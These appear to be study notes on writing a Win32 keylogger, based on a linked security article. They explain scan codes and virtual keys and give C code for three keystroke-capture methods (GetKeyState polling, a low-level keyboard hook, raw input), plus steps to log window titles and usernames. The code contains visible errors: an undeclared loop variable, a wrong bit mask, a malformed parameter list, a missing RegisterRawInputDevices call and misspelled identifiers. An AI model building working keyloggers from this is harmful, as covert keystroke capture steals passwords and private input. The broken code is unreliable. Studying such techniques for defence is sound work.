# Retrieving keystrokes
Here are 3 methods to retrieve keystrokes. Additional work is needed in order to reconstruct the character streams.


## What are Scan Codes
Single or multi-byte values produced by the keyboard firmware and are independent of the layout. 

### Multi-Byte 
- start with 0xE0, 0xE1, 0xE2 
- Refered to as extended scan codes
- Distinguish between left ctrl and right ctrl keys

| Key | Scan Code | Key | Scan Code | 
| --- | --------- | --- | --------- | 
| ESCAPE | 0x01 | R | 0x13 |
| 1 | 0x02 | ENTER | 0x1C |
| 2 | 0x03 | NUMPAD_ENTER | 0xE0 0x1C |
| Q | 0x10 | LEFT CONTROL | 0x1D |
| W | 0x11 | RIGHT CONTROL | 0xE0 0x1D |
| E | 0x12 | PAUSE | 0xE1 0x1D |

### Key Presses
A scan code will indicate whether a key is pressed
```sh
0x1D # Left control pressed
0x13 # R is pressed
0x93 # R is released
0x9D # Left control released
```

## Layouts
Contain information about how to convert scan codes into virtual keys and then into characters that can be displayed.

## Virtual Keys
Used to identify keyboard keys in a language indepenedent manner. There are 256 total

| Local | Layout | Scan Code | Virtual Key |
| ----- | ------ | --------- | ----------- |
| fr-FR | kbdfr.dll | 0x10 | VK_A(0x41) | 
| en-US | kbdus.dll | 0x10 | VK_Q (0x51) |


## Characters and Gylphs
Multiple unicode characters can be represented by a single glyph called a ligature.

### 1. Process keystrokes
A function to handle the processing that follows a key press.
```c
void process_kbd_event(
    uint8_t scan_code,
    bool e0,
    bool e1,
    bool keyup,
    uint8_t vk
);
```

### 2. GETKEYSTATE
Retrive the current state for a specified input virtual key:
- provided by `user32.dll`
- defined in `winuser.h`

```c
SHORT GetKeyState(int nVirtKey);
```

`MapVirtualKeyA` 
- Get scan codes that originated the virtual key press or release
- Call repeatedly for all 256 virtual key values
- Keep state in memory
- Compare current status for state change (keypress)
- Alternatives (`GetKeyboardState` or `GetAsyncKeyState`)

```c
void get_kb_state(short kbs[256])
{
    for (int i = 0; i < 256; i++)
        kbs[i] = GetKeyState(i);
}

int main()
{
    short kbs_last[256] = {};
    get_kb_state(kbs_last);

    while (i) {
        short kbs[256] = {}
        get_kb_state(kbs);

        for (int i = 0; i < 256; i++)
            if (kbs[i] != kbs_last[i]) {
                int vsc = MapVirtualKeyA(i, MAP_VK_TO_VSC_EX);
                int e0 = ((vsc >> 8)) & 0xff) == 0xe0;
                int e1 = ((vsc >> 8)) & 0xff) == 0xe1;
                int sc = vsc & 0xff;
                int up = (kbs[i] & 0xc00000000) == 0;

                process_kbd_event(sc, e0, e1, up, i);
            }
            memcpy(kbs_last, kbs, sizeof(kbs_last));
            Sleep(5);
    }
}
```

## 2. SETWINDOWSHOOKEX
Another technique is the use of global windows hooks. Specifically `WH_KEYBOARD_LL` and `WH_KEYBOARD`
- 2 modes (global, thread)
- when using thread the callback to process the event needs to be pacakaged as a dll which is injected into the hooked process. (avoid)
- Low level hooks prefixed with `_LL` can only run in global mode and don't have that restriction.

```c
HHOOK SetWindowsHookExA(
    [in] int idHook,
    [in] HOOKPROC lpfn,
    [in] HINSTANCE hmod,
    [in] DWORD dwThreadId
);
```

To receive low level keyboard events, yo uneed to give a callback and then process window event messages.
```c
LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM wparam, LPARAM, lparam)
{
    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) lparam;
    process_kdb_event(p->scanCode, p->flags & LLKHF_EXTENED, 0, p->flags & LLKHF_UP, p->vkCode);
    return CallNextHookEX(NULL, code, wparam, lparam);
}

int main()
{
    HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hhkLowLevelKybd);
    return 0;
}
```

### 3. GETINPUTDATA
Uses direct input APIs
- register custom widow class with `RegisterClassEXA`
- use `CreateWindowExA` to instantiate a window
- call `RegisterRawInputDevices` to specify a generic (0x01) keyboard (0x06)
- specify the `RIDEV_INPUTSINK` flag and target the window that will receive events
- process loop that uses `GetMessage`, `TranslateMessage` and `DispatchMessage` 

```c
LRESULT CALLBACK wndproc(HWND window, UINT message, WPARAM wparam, LPARAM lparam)
{
    if (message != WM_INPUT) {
        return DefWindowProc(window, message, wparam, lparam);
    }

    char rid_buf[64];
    UINT rid_size = sizeof(rid_buf);

    if (GetRawInputData((HRAWINPUT)lparam, RID_INPUT, rid_buf, &rid_size, sizeof(RAWINPUTHEADER))) {
        RAWINPUT * raw = (RAWINPUT*)rid_buf;
        if (raw->header.dwType == RIM_TYPEKEYBOARD) {
            RAWKEYBOARD * rk = &raw->data.keyboard;
            process_kbd_event(rk->MakeCode, rk->Flags & RI_KEY_E0, rk->Flags & RI_KEY_E1, rk->Flags & RI_KEY_BREAK, rk->VKey);
        }
    }
    return DefWindowProc(window, message, wparam, lparam);
}

int main(void) 
{
    WNDCLASSEX wc;
    ZeroMemory(&wc, sizeof(WNDCLASSEX));
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.lpfnWndProc = wndproc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = "rawkbd_wndclass";

    if (!RegisterClassEXA(&wc)) {
        return -1;
    }

    HWND rawkbd_wnd = CreateWindowExA(0, wc.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, GetModuleHandle(NULL), NULL);
    if (!rawkbd_wnd) {
        return -2;
    }

    RAWINPUTDEVICE devs = {
        0x01,
        0x06,
        RIDEV_INPUTSINK, 
        rawkbd_wnd
    };

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    DestroyWnidow(rawkbd_wnd);
    UnregisterClass(wc.lpszClassName, GetModuleHandle(NULL));
    return 0;
}
```

## Retrieving the Context
We can make a few improvements to our logger such as:
- window title
- current username
- timestamps

Steps:
1. Retrieve a handle to the current active window
2. Retrieve id of thread responsible to handle window
3. Call `GetkeyboardLayout` to retrieve handle to keyboard layout

```c
HWND hwnd = GetForegroundWindow();
DWORD thid = GetWindowThreadProcessId(hwnd, NULL);
HKL hkl = GetKeyboardLayout(thid);
```

To retrieve the process id:
- use `OpenThread` with `THREAD_QUERY_INFORMATION` 
- Call `GetProcessIdOfThread` 
- Using PID you can get process name by enumerating renning info like `GetSystemTime`, `GetWindowTextA()` 

## Translating to keyboard characters
Windows input model works as following:
![Windows Input Model](./windows-input-model.png')

## KBD*.DLL Structure
Keyboard layout DLLs export 2 functions
1. `KbdNlsLayerDescriptor`
2. `PBKDTABLES KbdLayerDescriptor(VOID)`

Left off here: https://www.synacktiv.com/publications/writing-a-decent-win32-keylogger-23
